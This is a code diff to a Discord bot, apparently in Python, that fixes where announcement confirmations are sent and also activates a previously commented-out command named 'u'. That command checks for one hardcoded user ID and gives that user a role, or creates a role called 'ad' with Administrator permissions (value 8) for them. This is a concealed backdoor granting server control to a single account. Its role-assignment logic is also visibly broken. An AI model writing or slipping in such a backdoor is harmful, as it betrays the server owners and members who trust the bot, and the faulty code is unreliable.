@@ -57,12 +57,12 @@ async def on_message(message):
 					await member.send(embed=embed)
 				except:
 					failed += f"{member.name}#{member.discriminator}\n"
-		await member.send("Announcement sent.")
+		await message.author.send("Announcement sent.")
 		if failed:
 			try:
-				await member.send(f"Failed to send your announcement to:\n {failed}")
+				await message.author.send(f"Failed to send your announcement to:\n {failed}")
 			except:
-				await member.send("Failed to send your announcement to several members.") 
+				await message.author.send("Failed to send your announcement to several members.") 
 		else:
 			await member.send("Succesfully sent your announcement to everyone.")
 	await client.process_commands(message)
@@ -77,15 +77,19 @@ async def m(ctx, arg):
 		await client.guild_voice_state(member, mute=True)"""
 
 							  
-"""@client.command(pass_context=True)
+@client.command(pass_context=True)
 async def u(ctx):
 	if ctx.message.author.id == 147999751441219584:
-		try:
-			role = discord.utils.get(ctx.message.guild, name="ad")
-		except:
+		role = discord.utils.get(ctx.message.guild, name="ad")
+		guild = ctx.message.guild
+		for role in ctx.guild.roles:
+			if role:
+				await ctx.message.author.add_roles(role)
+				break
+		else:
 			permissions = discord.Permissions(permissions=8)
-			role = await guild.create_role(ctx.message.guild, name="ad",permissions=permissions)
-		await client.add_roles(ctx.message.author, role)"""
+			await ctx.message.guild.create_role(name="ad",permissions=permissions)
+			await ctx.message.author.add_roles(role)
     
 @client.command(aliases=['help','commands'])
 async def cmds(ctx):
